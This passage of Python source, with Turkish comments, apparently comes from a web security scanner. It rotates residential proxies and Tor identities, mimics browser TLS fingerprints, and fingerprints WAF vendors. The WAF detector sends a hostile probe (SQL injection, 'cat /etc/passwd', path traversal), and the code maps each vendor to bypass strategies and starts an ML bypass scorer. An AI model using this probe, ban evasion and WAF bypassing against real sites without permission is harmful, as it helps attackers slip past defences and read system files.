        headers = dict(kw.pop("headers", {}) or {})
        for k, v in self.extra_headers.items():
            headers.setdefault(k, v)
        if headers:
            kw["headers"] = headers

        t0 = time.monotonic()
        try:
            raw = self._session.request(method.upper(), url, **kw)
            elapsed = time.monotonic() - t0
            _logger.debug(
                f"[TLSDriver] {method.upper()} {url} -> {raw.status_code} ({elapsed*1000:.0f}ms)"
            )
            return CffiResponse(raw)
        except Exception as exc:
            _logger.warning(f"[TLSDriver] İstek hatası: {exc}")
            raise

    # ------------------------------------------------------------------
    def close(self) -> None:
        if self._session is not None:
            try:
                self._session.close()
            except Exception as exc:
                _logger.debug(f"[TLSDriver] Session close failed: {exc!r}")
            self._session = None


# ---------------------------------------------------------------------------
# Yardımcı fabrika fonksiyonu
# ---------------------------------------------------------------------------
def make_cffi_driver(
    profile: str = "chrome_124",
    proxy_url: Optional[str] = None,
    verify: bool = True,
    timeout_connect: float = 10.0,
    timeout_read: float = 30.0,
    headers: Optional[Dict[str, str]] = None,
) -> Optional["CurlCffiDriver"]:
    """
    curl_cffi mevcut değilse None döner; mevcut ise yeni bir CurlCffiDriver örneği döner.
    """
    if not _CURL_CFFI_AVAILABLE:
        return None
    return CurlCffiDriver(
        profile=profile,
        proxy_url=proxy_url,
        verify=verify,
        timeout_pair=(timeout_connect, timeout_read),
        extra_headers=headers or {},
    )


# ===========================================================================
# MERGED FROM: websecure/core/proxy_pool.py
# Residential proxy pool — rotation, health check, strategies
# ===========================================================================
"""
proxy_pool.py — Gelişmiş Residential Proxy Rotation Havuzu.

Desteklenen vendor formatları:
  - BrightData (Luminati)
  - Oxylabs
  - SmartProxy
  - IPRoyal
  - Generic HTTP/SOCKS5 proxy

Özellikler:
  - Sağlık kontrolü (paralel, zaman aşımlı)
  - Başarısızlık sayacı -> otomatik devre dışı bırakma
  - Çoklu strateji: round_robin, weighted_random, sticky, lru
  - Ülke bazlı hedefleme
  - Vendor'a özel URL oluşturucu
"""

# Bir proxy'nin devre dışı bırakılması için izin verilen arka arkaya hata sayısı
DEFAULT_FAILURE_THRESHOLD = 3
# Sağlık kontrolü zaman aşımı (saniye)
HEALTH_CHECK_TIMEOUT = 8.0
# Sağlık kontrolü için kullanılan test URL'si
HEALTH_CHECK_URL = "https://api.ipify.org?format=json"


# ---------------------------------------------------------------------------
# Vendor URL Oluşturucular
# ---------------------------------------------------------------------------

def build_brightdata_url(
    customer: str,
    zone: str,
    password: str,
    country: Optional[str] = None,
    session_id: Optional[str] = None,
) -> str:
    """
    BrightData (Luminati) proxy URL formatı.
    Örnek: http://brd-customer-CUST-zone-ZONE-country-us:PASS@brd.superproxy.io:22225
    """
    username = f"brd-customer-{customer}-zone-{zone}"
    if country:
        username += f"-country-{country.lower()}"
    if session_id:
        username += f"-session-{session_id}"
    return f"http://{username}:{password}@brd.superproxy.io:22225"


def build_oxylabs_url(
    username: str,
    password: str,
    country: Optional[str] = None,
    session_id: Optional[str] = None,
) -> str:
    """
    Oxylabs proxy URL formatı.
    Örnek: http://user-cc-US:PASS@pr.oxylabs.io:7777
    """
    user = username
    if country:
        user = f"{username}-cc-{country.upper()}"
    if session_id:
        user = f"{user}-sessid-{session_id}"
    return f"http://{user}:{password}@pr.oxylabs.io:7777"


def build_smartproxy_url(
    username: str,
    password: str,
    country: Optional[str] = None,
    port: int = 7000,
) -> str:
    """
    SmartProxy URL formatı.
    Örnek: http://user:PASS@gate.smartproxy.com:7000
    """
    host = "gate.smartproxy.com"
    if country:
        host = f"{country.lower()}.smartproxy.com"
    return f"http://{username}:{password}@{host}:{port}"


def build_iproyal_url(
    username: str,
    password: str,
    country: Optional[str] = None,
    session_id: Optional[str] = None,
) -> str:
    """
    IPRoyal URL formatı.
    Örnek: http://user_cc-US:PASS@geo.iproyal.com:12321
    """
    user = username
    if country:
        user = f"{username}_cc-{country.upper()}"
    if session_id:
        user = f"{user}_session-{session_id}"
    return f"http://{user}:{password}@geo.iproyal.com:12321"


def build_proxy_url(
    vendor: str,
    username: str,
    password: str,
    country: Optional[str] = None,
    session_id: Optional[str] = None,
    **kwargs,
) -> str:
    """
    Vendor adına göre doğru proxy URL formatını oluşturur.

    vendor: "brightdata" | "oxylabs" | "smartproxy" | "iproyal" | "generic"
    """
    v = vendor.lower().strip()
    if v in ("brightdata", "luminati", "brd"):
        customer = kwargs.get("customer", username)
        zone = kwargs.get("zone", "residential")
        return build_brightdata_url(customer, zone, password, country, session_id)
    if v == "oxylabs":
        return build_oxylabs_url(username, password, country, session_id)
    if v in ("smartproxy", "smart"):
        return build_smartproxy_url(username, password, country)
    if v in ("iproyal", "ipr"):
        return build_iproyal_url(username, password, country, session_id)
    # generic: URL'yi aynen döndür
    return username  # generic durumda username=url olarak geçilir


# ---------------------------------------------------------------------------
# Veri Sınıfları
# ---------------------------------------------------------------------------

@dataclass
class ProxyEntry:
    """Tek bir proxy kaydı."""
    url: str
    vendor: str = "generic"
    country: Optional[str] = None
    weight: int = 1
    sticky_ttl: int = 0          # saniye; 0 = her istekte rotate
    consecutive_failures: int = field(default=0, compare=False)
    last_used: float = field(default=0.0, compare=False)
    last_success: float = field(default=0.0, compare=False)
    disabled: bool = field(default=False, compare=False)

    def as_requests_dict(self) -> Dict[str, str]:
        """requests kütüphanesi için proxies sözlüğü."""
        return {"http": self.url, "https": self.url}

    @property
    def scheme(self) -> str:
        p = urlparse(self.url)
        return p.scheme.lower()

    @property
    def is_socks(self) -> bool:
        return self.scheme.startswith("socks")


@dataclass
class _StickySlot:
    entry: ProxyEntry
    expires_at: float


# ---------------------------------------------------------------------------
# Ana Havuz Sınıfı
# ---------------------------------------------------------------------------

class ResidentialProxyPool:
    """
    Residential proxy rotation havuzu.

    config.json yapısı::

        "network": {
            "proxies": {
                "rotate": "weighted_random",
                "failure_threshold": 3,
                "health_check_on_init": false,
                "pool": [
                    "http://user:pass@host:port",
                    {
                        "url": "socks5h://user:pass@host:1080",
                        "vendor": "brightdata",
                        "country": "us",
                        "weight": 3,
                        "sticky_ttl": 300
                    }
                ]
            }
        }
    """

    def __init__(self, cfg: dict) -> None:
        self._lock = threading.Lock()
        self._entries: List[ProxyEntry] = []
        self._rr_idx: int = 0
        self._sticky: Dict[str, _StickySlot] = {}
        self._failure_threshold: int = DEFAULT_FAILURE_THRESHOLD
        self.strategy: str = "round_robin"

        self._load(cfg)

    # ------------------------------------------------------------------
    # Config yükleme
    # ------------------------------------------------------------------

    def _load(self, cfg: dict) -> None:
        net = cfg.get("network") or {}
        p = net.get("proxies") or {}
        if not isinstance(p, dict):
            return

        self.strategy = str(p.get("rotate", "round_robin"))
        self._failure_threshold = int(p.get("failure_threshold", DEFAULT_FAILURE_THRESHOLD))
        do_health = bool(p.get("health_check_on_init", False))

        raw_pool = p.get("pool") or []
        for item in raw_pool:
            entry = self._parse_entry(item)
            if entry:
                self._entries.append(entry)

        _logger.info(f"[ProxyPool] {len(self._entries)} proxy yüklendi, strateji={self.strategy}")

        if do_health and self._entries:
            self._run_health_check_all(remove_dead=True)

    @staticmethod
    def _parse_entry(item) -> Optional[ProxyEntry]:
        if isinstance(item, str) and item.strip():
            return ProxyEntry(url=item.strip())
        if isinstance(item, dict):
            url = item.get("url", "").strip()
            if not url:
                return None
            return ProxyEntry(
                url=url,
                vendor=str(item.get("vendor", "generic")),
                country=item.get("country"),
                weight=int(item.get("weight", 1)),
                sticky_ttl=int(item.get("sticky_ttl", 0)),
            )
        return None

    # ------------------------------------------------------------------
    # Strateji metodları
    # ------------------------------------------------------------------

    @property
    def enabled(self) -> bool:
        with self._lock:
            return any(not e.disabled for e in self._entries)

    def _active(self) -> List[ProxyEntry]:
        """Devre dışı olmayan girişleri döner."""
        return [e for e in self._entries if not e.disabled]

    def next(
        self,
        key: str = "",
        strategy: Optional[str] = None,
        country: Optional[str] = None,
    ) -> Optional[ProxyEntry]:
        """
        Strateji'ye göre bir sonraki proxy'yi seçer.

        key     : sticky/hash stratejileri için anahtar (genellikle hedef URL)
        strategy: override; None ise self.strategy kullanılır
        country : ülke filtreleme (None = filtre yok)
        """
        with self._lock:
            pool = self._active()
            if country:
                filtered = [e for e in pool if e.country and e.country.lower() == country.lower()]
                if filtered:
                    pool = filtered

            if not pool:
                logger.warning("[ProxyPool] No active proxies available (strategy=%s, country=%s)", strategy, country)
                return None

            s = (strategy or self.strategy).lower()

            if s == "sticky" and key:
                return self._pick_sticky(key, pool)
            if s == "weighted_random":
                return self._pick_weighted(pool)
            if s == "lru":
                return self._pick_lru(pool)
            if s == "per_target" and key:
                idx = int(hashlib.md5(key.encode()).hexdigest(), 16) % len(pool)
                entry = pool[idx]
                entry.last_used = time.monotonic()
                return entry
            # round_robin (varsayılan)
            return self._pick_rr(pool)

    def _pick_rr(self, pool: List[ProxyEntry]) -> ProxyEntry:
        self._rr_idx = (self._rr_idx + 1) % len(pool)
        e = pool[self._rr_idx]
        e.last_used = time.monotonic()
        return e

    def _pick_weighted(self, pool: List[ProxyEntry]) -> ProxyEntry:
        weights = [e.weight for e in pool]
        e = random.choices(pool, weights=weights, k=1)[0]
        e.last_used = time.monotonic()
        return e

    def _pick_lru(self, pool: List[ProxyEntry]) -> ProxyEntry:
        e = min(pool, key=lambda x: x.last_used)
        e.last_used = time.monotonic()
        return e

    def _pick_sticky(self, key: str, pool: List[ProxyEntry]) -> ProxyEntry:
        now = time.monotonic()
        slot = self._sticky.get(key)
        if slot and not slot.entry.disabled and now < slot.expires_at:
            slot.entry.last_used = now
            return slot.entry
        # Yeni sticky seçimi
        e = self._pick_weighted(pool)
        ttl = e.sticky_ttl or 300
        self._sticky[key] = _StickySlot(entry=e, expires_at=now + ttl)
        return e

    # ------------------------------------------------------------------
    # Sağlık takibi
    # ------------------------------------------------------------------

    def record_success(self, entry: ProxyEntry) -> None:
        with self._lock:
            entry.consecutive_failures = 0
            entry.last_success = time.monotonic()
            entry.disabled = False

    def record_failure(self, entry: ProxyEntry) -> None:
        with self._lock:
            entry.consecutive_failures += 1
            if entry.consecutive_failures >= self._failure_threshold:
                entry.disabled = True
                _logger.warning(
                    f"[ProxyPool] Proxy devre dışı bırakıldı "
                    f"({entry.consecutive_failures} hata): {entry.url[:40]}"
                )

    def reenable_all(self) -> None:
        """Tüm proxy'leri yeniden etkinleştirir (hata sayaçlarını sıfırlar)."""
        with self._lock:
            for e in self._entries:
                e.consecutive_failures = 0
                e.disabled = False
        _logger.info("[ProxyPool] Tüm proxy'ler yeniden etkinleştirildi.")

    # ------------------------------------------------------------------
    # Sağlık kontrolü
    # ------------------------------------------------------------------

    def health_check_all(
        self,
        timeout: float = HEALTH_CHECK_TIMEOUT,
        test_url: str = HEALTH_CHECK_URL,
        remove_dead: bool = False,
        max_workers: int = 10,
    ) -> Dict[str, dict]:
        """
        Tüm proxy'leri paralel olarak kontrol eder.

        Dönüş::

            {
                "http://proxy:port": {
                    "ok": True,
                    "ip": "1.2.3.4",
                    "latency_ms": 312,
                    "error": None
                },
                ...
            }
        """
        results: Dict[str, dict] = {}
        entries = list(self._entries)

        def _check(entry: ProxyEntry) -> tuple[str, dict]:
            import requests as _req
            t0 = time.monotonic()
            try:
                r = _req.get(
                    test_url,
                    proxies=entry.as_requests_dict(),
                    timeout=timeout,
                    verify=False,
                )
                latency = int((time.monotonic() - t0) * 1000)
                ip = ""
                try:
                    ip = r.json().get("ip", r.text.strip()[:20])
                except (ValueError, AttributeError) as exc:
                    _logger.debug(f"[ProxyPool] JSON parse for IP failed: {exc!r}")
                    ip = r.text.strip()[:20]
                return entry.url, {"ok": True, "ip": ip, "latency_ms": latency, "error": None}
            except Exception as exc:
                latency = int((time.monotonic() - t0) * 1000)
                return entry.url, {"ok": False, "ip": "", "latency_ms": latency, "error": str(exc)[:80]}

        with ThreadPoolExecutor(max_workers=max_workers) as ex:
            futures = {ex.submit(_check, e): e for e in entries}
            for fut in as_completed(futures):
                url, info = fut.result()
                results[url] = info

        if remove_dead:
            self._run_health_check_all(remove_dead=True, _results=results)
        return results

    def _run_health_check_all(
        self, remove_dead: bool = False, _results: Optional[Dict] = None
    ) -> None:
        if _results is None:
            _results = self.health_check_all(remove_dead=False)
        if remove_dead:
            with self._lock:
                for entry in self._entries:
                    info = _results.get(entry.url, {})
                    if not info.get("ok"):
                        entry.disabled = True
                        _logger.warning(f"[ProxyPool] Sağlık kontrolü başarısız: {entry.url[:40]}")
                    else:
                        entry.disabled = False
                        entry.consecutive_failures = 0

    # ------------------------------------------------------------------
    # Yardımcılar
    # ------------------------------------------------------------------

    def add(self, entry: ProxyEntry) -> None:
        with self._lock:
            if not any(e.url == entry.url for e in self._entries):
                self._entries.append(entry)

    def remove(self, url: str) -> None:
        with self._lock:
            self._entries = [e for e in self._entries if e.url != url]

    def stats(self) -> Dict[str, Any]:
        with self._lock:
            total = len(self._entries)
            active = sum(1 for e in self._entries if not e.disabled)
            return {
                "total": total,
                "active": active,
                "disabled": total - active,
                "strategy": self.strategy,
            }

    def __len__(self) -> int:
        return len(self._entries)

    def __repr__(self) -> str:
        s = self.stats()
        return (
            f"<ResidentialProxyPool total={s['total']} active={s['active']} "
            f"strategy={s['strategy']}>"
        )


# ---------------------------------------------------------------------------
# İzole tip import (stats Dict içinde Any kullanıldı)
# ---------------------------------------------------------------------------
# Any already imported at module top (line 11)


# ===========================================================================
# MERGED FROM: websecure/core/tor_manager.py
# Tor circuit management + EgressManager (Tor + proxy pool unified)
# ===========================================================================
import socket
import time
import threading
import logging
from typing import Optional, TYPE_CHECKING

_logger = logging.getLogger(__name__)

class TorController:
    def __init__(self, control_port: int = 9051, password: Optional[str] = None):
        self.control_port = control_port
        self.password = password
        self._stop_event = threading.Event()
        self._thread = None

    def renew_identity(self) -> bool:
        """Sends SIGNAL NEWNYM to Tor Control Port to request a new IP."""
        try:
            with socket.create_connection(("127.0.0.1", self.control_port), timeout=5) as s:
                f = s.makefile('rw')
                
                # Authenticate
                if self.password:
                    f.write(f'AUTHENTICATE "{self.password}"\r\n')
                else:
                    f.write('AUTHENTICATE ""\r\n')
                f.flush()
                
                resp = f.readline()
                if "250" not in resp:
                    _logger.warning(f"[Tor] Auth failed: {resp.strip()}")
                    # Try fallback without auth if empty string failed? Usually 515
                    return False

                # Signal New Nym
                f.write('SIGNAL NEWNYM\r\n')
                f.flush()
                
                resp = f.readline()
                if "250" in resp:
                    _logger.info("[Tor] External IP rotation requested (SIGNAL NEWNYM).")
                    try:
                        from websecure.core.circuit_breaker import cb_reset as _cb_reset
                        _cb_reset()
                    except Exception as _fix_e:
                        logger.debug(f"[core.waf_bypass] {type(_fix_e).__name__}: {_fix_e!r}")
                    return True
                else:
                    _logger.warning(f"[Tor] Signal failed: {resp.strip()}")
                    return False
        except ConnectionRefusedError:
            _logger.error("[Tor] Could not connect to Control Port (9051). Is Tor running?")
            return False
        except Exception as e:
            _logger.error(f"[Tor] Error rotating IP: {e}")
            return False

    def start_rotation_loop(self, interval_seconds: int = 120):
        """Starts a background thread to rotate IP every interval_seconds."""
        if self._thread and self._thread.is_alive():
            return

        self._stop_event.clear()
        
        def _loop():
            _logger.info(f"[Tor] IP Rotation loop started (Every {interval_seconds}s).")
            while not self._stop_event.is_set():
                # Wait for interval
                if self._stop_event.wait(interval_seconds):
                    break
                # Rotate
                self.renew_identity()
        
        self._thread = threading.Thread(target=_loop, daemon=True, name="TorRotator")
        self._thread.start()

    def stop(self):
        """Stops the rotation loop."""
        self._stop_event.set()
        if self._thread:
            self._thread.join(timeout=1.0)

# ============================================================================
# Compatibility / Global Helpers (Merged from tor_control.py)
# ============================================================================

_global_tor: Optional[TorController] = None

def init_tor_control(cfg: dict = None):
    """
    Initializes the global Tor controller.
    """
    global _global_tor
    if not cfg: 
        return
    
    enabled = cfg.get("enabled", False)
    if not enabled:
        return

    control_port = int(cfg.get("control_port", 9051))
    password = cfg.get("password", None)
    
    _global_tor = TorController(control_port=control_port, password=password)
    # Optional: Start rotation if configured in cfg? For now just init.

def rotate_tor_identity() -> bool:
    """Helper to rotate identity if global controller is init."""
    global _global_tor
    if _global_tor:
        return _global_tor.renew_identity()
    return False

def start_auto_rotation(interval: int = 120):
    """Starts the auto-rotation loop on the global Tor controller."""
    global _global_tor
    if _global_tor:
        _global_tor.start_rotation_loop(interval)
        return True
    return False


# ============================================================================
# EgressManager — Tor + Residential Proxy havuzunu birleştiren birleşik yönetici
# ============================================================================

class EgressManager:
    """
    Çıkış trafiği yöneticisi.

    Öncelik sırası:
      1. Tor (SOCKS5, 127.0.0.1:9050) — etkinse
      2. Residential Proxy Pool — kayıt varsa
      3. Doğrudan bağlantı (None döner)

    Kullanım::

        em = EgressManager(cfg)
        proxy_url = em.get_next_egress()
        # proxy_url örn: "socks5h://127.0.0.1:9050" veya "http://user:pass@host:port"
        # proxy_url None ise doğrudan bağlantı
    """

    def __init__(self, cfg: dict = None) -> None:
        cfg = cfg or {}

        # Tor ayarları
        tor_cfg = (cfg.get("privacy") or {}).get("tor") or cfg.get("tor") or {}
        self._tor_enabled = bool(tor_cfg.get("enabled", False))
        self._tor_socks_port = int(tor_cfg.get("socks_port", 9050))
        self._tor_proxy_url = f"socks5h://127.0.0.1:{self._tor_socks_port}"

        # Residential proxy havuzu
        try:
            # ResidentialProxyPool defined in this module (merged from proxy_pool.py)
            self._pool: Optional[ResidentialProxyPool] = ResidentialProxyPool(cfg)
        except Exception as exc:
            _logger.debug(f"[EgressManager] ResidentialProxyPool init failed: {exc!r}")
            self._pool = None

        # Tor kontrolcüsü (opsiyonel — Tor kuruluysa)
        self._tor_ctrl: Optional[TorController] = None
        if self._tor_enabled:
            control_cfg = tor_cfg.get("control") or {}
            ctrl_port = int(control_cfg.get("port", 9051))
            ctrl_pass = control_cfg.get("password")
            self._tor_ctrl = TorController(control_port=ctrl_port, password=ctrl_pass)

        _logger.info(
            f"[EgressManager] tor_enabled={self._tor_enabled}, "
            f"pool_size={len(self._pool) if self._pool else 0}"
        )

    # ------------------------------------------------------------------

    def get_next_egress(self, key: str = "", country: Optional[str] = None) -> Optional[str]:
        """
        Bir sonraki çıkış proxy URL'sini döner.

        key     : sticky/hash stratejisi için anahtar (genellikle hedef host)
        country : ülke bazlı hedefleme (yalnızca proxy pool için)
        """
        # 1) Tor
        if self._tor_enabled and self._is_tor_alive():
            return self._tor_proxy_url

        # 2) Residential proxy havuzu
        if self._pool and self._pool.enabled:
            entry = self._pool.next(key=key, country=country)
            if entry:
                return entry.url

        # 3) Doğrudan
        return None

    def record_success(self, proxy_url: str) -> None:
        """Kullanılan proxy'nin başarısını kaydet."""
        if self._pool:
            entry = self._find_entry(proxy_url)
            if entry:
                self._pool.record_success(entry)

    def record_failure(self, proxy_url: str) -> None:
        """Kullanılan proxy'nin başarısızlığını kaydet."""
        if proxy_url == self._tor_proxy_url:
            # Tor başarısızlığı -> yeni kimlik iste
            self.rotate_tor()
            return
        if self._pool:
            entry = self._find_entry(proxy_url)
            if entry:
                self._pool.record_failure(entry)

    def rotate_tor(self) -> bool:
        """Tor kimliğini yenile (SIGNAL NEWNYM)."""
        if self._tor_ctrl:
            return self._tor_ctrl.renew_identity()
        return rotate_tor_identity()

    def _find_entry(self, url: str):
        if self._pool:
            with self._pool._lock:
                for e in self._pool._entries:
                    if e.url == url:
                        return e
        return None

    def _is_tor_alive(self) -> bool:
        """Tor SOCKS portuna bağlanabilirliği hızlıca test eder."""
        import socket
        try:
            with socket.create_connection(("127.0.0.1", self._tor_socks_port), timeout=1):
                return True
        except OSError:
            return False

    def proxy_pool_stats(self) -> dict:
        if self._pool:
            return self._pool.stats()
        return {"total": 0, "active": 0, "disabled": 0}

    def health_check_pool(self, **kwargs) -> dict:
        if self._pool:
            return self._pool.health_check_all(**kwargs)
        return {}


# ---------------------------------------------------------------------------
# Global EgressManager singleton
# ---------------------------------------------------------------------------

_global_egress: Optional[EgressManager] = None


def init_egress_manager(cfg: dict = None) -> EgressManager:
    """Global EgressManager'ı başlatır."""
    global _global_egress
    _global_egress = EgressManager(cfg or {})
    return _global_egress


def get_egress_manager() -> Optional[EgressManager]:
    """Global EgressManager örneğini döner (başlatılmamışsa None)."""
    return _global_egress


def get_tor_proxy() -> Optional[Dict[str, str]]:
    """
    Return a requests-compatible proxy dict for the current Tor/residential egress.

    Returns ``{"http": url, "https": url}`` or ``None`` if no proxy is configured.
    Used by http._try_rotate_identity() after a ban is detected.
    """
    em = _global_egress
    if em is not None:
        url = em.get_next_egress()
        if url:
            return {"http": url, "https": url}
    return None


# ===========================================================================
# MERGED FROM: websecure/core/waf_detector.py
# WAF fingerprinting — vendor detection, confidence scoring, bypass strategy selection
# ===========================================================================
"""
websecure.core.waf_detector
----------------------------
WAF fingerprinting via probe-response analysis.
Identifies vendor, confidence level, and recommends bypass strategies.
"""
# ---------------------------------------------------------------------------
# WAF Signatures
# ---------------------------------------------------------------------------
# Each entry: { "headers": [(name, pattern)], "body": [pattern], "cookies": [name],
#               "status": [int], "bypass_strategies": [...] }
_WAF_SIGNATURES: Dict[str, Dict] = {
    "cloudflare": {
        "headers": [
            ("server", r"cloudflare"),
            ("cf-ray", r".+"),
            ("cf-cache-status", r".+"),
        ],
        "body": [
            r"Attention Required! \| Cloudflare",
            r"Ray ID:",
            r"cloudflare\.com/5xx-error",
        ],
        "cookies": ["__cfduid", "cf_clearance", "__cf_bm"],
        "status": [403, 503],
        "bypass_strategies": [
            "chunked_encoding", "content_type_mismatch", "xff_internal_cidr",
            "unicode_normalization", "http2_pseudo_header_order",
            "tls_fingerprint_chrome", "random_path_suffix", "captcha_bypass",
        ],
    },
    "aws_waf": {
        "headers": [
            ("x-amzn-requestid", r".+"),
            ("x-amz-cf-id", r".+"),
        ],
        "body": [
            r"AWS WAF",
            r"Request blocked",
        ],
        "cookies": ["aws-waf-token", "AWSALB"],
        "status": [403],
        "bypass_strategies": [
            "header_injection_variants", "param_fragmentation",
            "json_unicode_escape", "hpp_duplicate_params",
            "overlong_utf8", "double_url_encoding",
        ],
    },
    "imperva": {
        "headers": [
            ("x-iinfo", r".+"),
            ("x-cdn", r"Imperva"),
            ("server", r"Imperva"),
        ],
        "body": [
            r"Incapsula incident ID",
            r"Request unsuccessful\. Incapsula",
            r"_Incapsula_Resource",
        ],
        "cookies": ["visid_incap", "incap_ses"],
        "status": [403],
        "bypass_strategies": [
            "chunked_small_chunks", "path_parameter_pollution",
            "accept_header_rotation", "unicode_normalization",
            "referrer_spoofing", "newline_injection",
        ],
    },
    "akamai": {
        "headers": [
            ("server", r"AkamaiGHost"),
            ("x-check-cacheable", r".+"),
        ],
        "body": [
            r"Access Denied",
            r"Reference #\d+\.\w+\.\d+",
            r"akamai",
        ],
        "cookies": ["ak_bmsc", "bm_sz"],
        "status": [403],
        "bypass_strategies": [
            "xff_internal_cidr", "case_sensitivity_bypass",
            "double_url_encoding", "content_type_mismatch",
            "http2_pseudo_header_order",
        ],
    },
    "f5_bigip": {
        "headers": [
            ("server", r"BigIP"),
            ("x-wa-info", r".+"),
        ],
        "body": [
            r"The requested URL was rejected",
            r"F5 Networks",
        ],
        "cookies": ["TS[0-9a-f]{8}", "BIGipServer"],
        "status": [403],
        "bypass_strategies": [
            "chunked_encoding", "hpp_duplicate_params",
            "unicode_normalization", "path_parameter_pollution",
        ],
    },
    "modsecurity": {
        "headers": [
            ("server", r"mod_security"),
            ("x-webobjects-loadavg", r".+"),
        ],
        "body": [
            r"ModSecurity",
            r"Not Acceptable!.*?Apache",
            r"Mod_Security",
            r"406 Not Acceptable",
        ],
        "cookies": [],
        "status": [403, 406],
        "bypass_strategies": [
            "chunked_encoding", "content_type_mismatch",
            "overlong_utf8", "newline_injection",
            "case_sensitivity_bypass", "double_url_encoding",
        ],
    },
    "sucuri": {
        "headers": [
            ("server", r"Sucuri/Cloudproxy"),
            ("x-sucuri-id", r".+"),
            ("x-sucuri-cache", r".+"),
        ],
        "body": [
            r"Sucuri WebSite Firewall",
            r"Access Denied - Sucuri",
        ],
        "cookies": ["sucuri_cloudproxy_uuid"],
        "status": [403],
        "bypass_strategies": [
            "referrer_spoofing", "xff_internal_cidr",
            "unicode_normalization", "random_path_suffix",
        ],
    },
    "barracuda": {
        "headers": [
            ("server", r"barracuda"),
        ],
        "body": [
            r"Barracuda Web Application Firewall",
            r"bwf_bl",
        ],
        "cookies": ["barra_counter_session"],
        "status": [400, 403],
        "bypass_strategies": [
            "chunked_encoding", "hpp_duplicate_params",
            "content_type_mismatch",
        ],
    },
    "fortiweb": {
        "headers": [
            ("server", r"FortiWeb"),
            ("x-fw-errcode", r".+"),
            ("x-cache", r"MISS from FortiWeb"),
        ],
        "body": [
            r"FortiWeb",
            r"This request is blocked by the Web Application Firewall",
            r"block-page\.fortiwebcloud\.net",
        ],
        "cookies": ["FORTITOKEN"],
        "status": [403, 400],
        "bypass_strategies": [
            "chunked_small_chunks", "overlong_utf8",
            "double_url_encoding", "unicode_normalization",
            "path_parameter_pollution", "newline_injection",
        ],
    },
    "azure_waf": {
        "headers": [
            ("x-azure-ref", r".+"),
            ("x-ms-request-id", r".+"),
            ("server", r"Microsoft-Azure-Application-Gateway"),
        ],
        "body": [
            r"The request is blocked",
            r"Azure Web Application Firewall",
            r"RequestId:",
        ],
        "cookies": [],
        "status": [403],
        "bypass_strategies": [
            "chunked_encoding", "json_unicode_escape",
            "http2_pseudo_header_order", "double_url_encoding",
            "case_sensitivity_bypass", "overlong_utf8",
        ],
    },
}

# Malicious probe payload — triggers most WAFs
_PROBE_PAYLOAD = "?id=1'+OR+1=1--&cmd=cat+/etc/passwd&path=../../../../etc/passwd"


@dataclass
class WAFProfile:
    vendor: str = "unknown"
    confidence: float = 0.0
    bypass_strategies: List[str] = field(default_factory=list)
    raw_response: Optional[Dict] = None

    @property
    def detected(self) -> bool:
        return self.confidence >= 0.3


class WAFDetector:
    """
    Detects WAF presence by sending a known-malicious probe request
    and scoring the response against vendor signature databases.
    """

    def __init__(self, timeout: int = 10):
        self.timeout = timeout

    def detect(self, url: str, session=None) -> WAFProfile:
        """
        Send probe and analyze response.
        Returns WAFProfile with detected vendor and confidence.
        """
        probe_url = url.rstrip("/") + _PROBE_PAYLOAD
        headers, body, status, cookies = self._send_probe(probe_url, session)

        best_vendor = "unknown"
        best_score = 0.0
        best_strategies: List[str] = []

        for vendor, sig in _WAF_SIGNATURES.items():
            score = self._score_vendor(sig, headers, body, status, cookies)
            if score > best_score:
                best_score = score
                best_vendor = vendor
                best_strategies = sig.get("bypass_strategies", [])

        if best_score < 0.25:
            # Generic WAF detection (score for any anomalous response)
            if status in (403, 406, 429, 503) and body:
                best_vendor = "generic"
                best_score = 0.30
                best_strategies = ["chunked_encoding", "unicode_normalization",
                                   "xff_internal_cidr", "double_url_encoding"]

        profile = WAFProfile(
            vendor=best_vendor,
            confidence=round(min(best_score, 1.0), 2),
            bypass_strategies=best_strategies,
        )
        if profile.detected:
            _logger.info(f"[WAFDetector] Detected: {best_vendor} (confidence={profile.confidence:.0%})")
        else:
            _logger.debug("[WAFDetector] No WAF detected")
        return profile

    def _send_probe(self, url: str, session) -> Tuple[Dict, str, int, Dict]:
        """Send probe request and return (headers, body, status, cookies)."""
        headers: Dict = {}
        body = ""
        status = 0
        cookies: Dict = {}

        try:
            if session:
                resp = session.get(url, timeout=self.timeout, allow_redirects=True)
            else:
                import requests as _req
                resp = _req.get(url, timeout=self.timeout, allow_redirects=True,
                                headers={"User-Agent": "Mozilla/5.0 (compatible; WebSecure/3.0)"})
            headers = dict(resp.headers)
            body = resp.text[:4096]
            status = resp.status_code
            cookies = dict(resp.cookies)
        except Exception as e:
            _logger.debug(f"[WAFDetector] Probe failed: {e}")

        return headers, body, status, cookies

    def _score_vendor(self, sig: Dict, headers: Dict, body: str,
                      status: int, cookies: Dict) -> float:
        score = 0.0
        headers_lower = {k.lower(): v.lower() for k, v in headers.items()}

        # Header name presence
        for h_name, h_pattern in sig.get("headers", []):
            val = headers_lower.get(h_name.lower(), "")
            if val and re.search(h_pattern, val, re.I):
                score += 0.35

        # Body patterns
        for bp in sig.get("body", []):
            if re.search(bp, body, re.I | re.S):
                score += 0.25

        # Cookie presence
        for c_name in sig.get("cookies", []):
            for ck in cookies:
                if re.search(c_name, ck, re.I):
                    score += 0.2
                    break

        # Status code match
        if status in sig.get("status", []):
            score += 0.1

        return score


# Convenience function
def detect_waf(url: str, session=None, timeout: int = 10) -> WAFProfile:
    """Detect WAF at the given URL. Returns WAFProfile."""
    detector = WAFDetector(timeout=timeout)
    return detector.detect(url, session=session)


# ===========================================================================
# ADIM 11 — WAF Bypass: ML Scorer, Adaptive Mutation, HTTP/2 Multiplexing
# ===========================================================================
from collections import defaultdict
import math


# ---------------------------------------------------------------------------
# WAFBypassMLScorer — epsilon-greedy scoring for strategy selection
# ---------------------------------------------------------------------------

class WAFBypassMLScorer:
    """
    ML/scoring-based WAF bypass strategy selector.

    Tracks per-strategy success rates across requests. Uses epsilon-greedy
    selection: 80% exploit the best-scoring strategy, 20% explore randomly.

    Feed outcomes via record_attempt(). Retrieve ranked strategies via
    rank_strategies() or best_strategy().

    SOLID/SRP: Only responsible for strategy scoring and selection.
    """

    def __init__(self, epsilon: float = 0.20, decay: float = 0.95):
        """
        epsilon: exploration probability (0.20 = 20% random exploration)
        decay:   score decay factor applied over time (0.95 per ranking call)
        """
        self._epsilon = epsilon
        self._decay = decay
        self._stats: Dict[str, Dict[str, Any]] = defaultdict(
            lambda: {"attempts": 0, "successes": 0, "score": 0.5, "last_ts": 0.0}
        )
        self._lock = threading.Lock()

    def record_attempt(
        self,
        strategy: str,
        *,
        blocked: bool,
        status_code: int = 200,
        response_time_ms: float = 0.0,
    ) -> None:
        """
        Record the outcome of applying a bypass strategy.

        blocked=False -> request got through (success).
